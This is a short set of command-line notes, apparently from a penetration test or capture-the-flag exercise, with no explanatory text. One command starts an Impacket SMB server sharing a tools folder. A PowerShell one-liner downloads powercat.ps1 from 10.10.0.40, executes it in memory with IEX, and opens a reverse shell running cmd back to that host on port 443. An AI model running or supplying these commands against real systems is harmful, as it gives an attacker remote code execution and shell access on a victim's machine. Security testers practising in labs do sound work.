python3 /usr/share/doc/python3-impacket/examples/smbserver.py tools .

powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.0.40/powercat.ps1');powercat -c 10.10.0.40 -p 443 -e cmd"